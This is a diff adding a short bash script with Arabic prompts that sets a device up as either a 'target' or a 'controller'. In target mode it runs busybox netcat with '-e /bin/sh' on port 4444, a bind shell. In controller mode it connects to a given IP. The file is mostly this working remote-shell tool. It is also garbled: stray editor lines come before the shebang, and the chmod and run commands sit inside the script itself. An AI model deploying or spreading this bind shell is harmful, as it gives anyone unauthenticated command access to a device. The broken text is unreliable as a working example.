@@ -1,0 +1,23 @@
+G
+^G
+help
+#!/bin/bash
+
+echo "اختر وضع الجهاز:"
+echo "1) جهاز هدف (يستقبل اتصال)"
+echo "2) جهاز تحكم (يتصل بالجهاز الهدف)"
+read -p "اختر 1 أو 2: " mode
+
+if [ "$mode" == "1" ]; then
+    echo "تشغيل الجهاز الهدف: الاستماع على البورت 4444..."
+    busybox nc -l -p 4444 -e /bin/sh
+elif [ "$mode" == "2" ]; then
+    read -p "ادخل IP الجهاز الهدف: " target_ip
+    echo "الاتصال بـ $target_ip على بورت 4444..."
+    busybox nc $target_ip 4444
+else
+    echo "اختيار غير صحيح، اعد تشغيل السكربت."
+fi
+chmod +x netcat_control.sh
+./netcat_control.sh
+
